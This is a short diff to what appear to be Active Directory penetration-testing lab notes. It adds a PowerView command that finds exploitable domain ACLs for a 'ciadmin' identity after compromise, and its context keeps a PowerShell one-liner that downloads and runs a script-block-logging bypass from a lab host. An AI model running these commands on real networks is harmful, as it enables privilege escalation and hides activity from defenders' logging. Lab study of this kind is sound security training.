@@ -1,3 +1,10 @@
+
+> [!NOTE] **NOTE**
+> **REVIEW WHAT PRIVILEGES A USER HAS AFTER COMPROMISE** (BloodHound - PowerView)
+> 
+> ```powershell
+>  Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
+
 ```powershell
 iex (iwr http://172.16.100.48/sbloggingbypass.txt -useb)
 ```
